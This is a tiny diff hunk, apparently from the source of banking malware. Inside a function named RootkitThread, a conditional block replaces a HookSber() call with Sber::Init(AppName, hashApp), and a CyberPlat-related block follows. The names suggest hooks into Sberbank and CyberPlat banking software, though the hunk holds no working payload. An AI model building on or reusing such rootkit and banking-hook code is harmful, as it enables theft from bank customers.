@@ -442,7 +442,7 @@ DWORD WINAPI RootkitThread( LPVOID lpData, LPVOID, LPVOID )
 	#endif
 
 	#ifdef SBERH
-		HookSber();
+		Sber::Init( AppName, hashApp );
 	#endif 
 
 	#ifdef CyberPlatDLLH
